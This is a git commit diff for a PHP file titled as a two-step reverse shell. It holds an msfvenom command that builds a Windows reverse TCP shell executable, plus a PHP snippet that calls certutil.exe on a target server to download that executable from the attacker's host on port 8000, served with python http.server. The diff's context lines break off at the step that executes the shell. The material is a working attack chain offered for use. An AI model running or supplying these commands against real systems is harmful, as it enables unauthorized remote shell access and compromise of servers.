bee03694e587ea276b6ca7aa03930184c9c60b15
Leon1278 <60759946+Leon1278@users.noreply.github.com>
2023-11-14 16:49:59 -0500

    Update two_step_php_revshell.php

--- two_step_php_revshell.php
+++ two_step_php_revshell.php
@@ -2,11 +2,12 @@
 # msfvenom -p windows/x64/shell_reverse_tcp LHOST={own-ip} LPORT={listening-port} -f exe -o reverse.exe
 
 # Following steps are two seperated files!
-
+# Before executing them, start python server in the dir of the files
+# python -m http.server 8000
 
 # Step1: This snippet uploads the revshell to the target server
 <?php 
-$exec = system('certutil.exe -urlcache -split -f "http://{own-ip}/reverse.exe" shell.exe', $val); 
+$exec = system('certutil.exe -urlcache -split -f "http://{own-ip}:8000/reverse.exe" shell.exe', $val); 
 ?>
 
 # Step2: Execute uploaded reverse shell
